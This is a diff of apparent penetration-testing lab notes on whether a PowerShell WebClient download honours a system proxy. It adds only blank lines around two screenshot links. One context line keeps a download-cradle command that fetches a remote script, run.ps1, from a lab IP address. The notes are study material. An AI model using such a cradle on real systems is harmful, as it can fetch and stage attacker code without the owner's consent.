@@ -8,9 +8,11 @@ $wc.DownloadString("http://192.168.49.150/run.ps1")
 ```
 
 Without Proxy:
+
 ![wo_proxy](../../../Screenshots/wo_proxy.png)
 
 With Proxy:
+
 ![w_proxy](../../../Screenshots/w_proxy.png)
 
 We can see that the system.net.webclient is aware of a proxy in use.
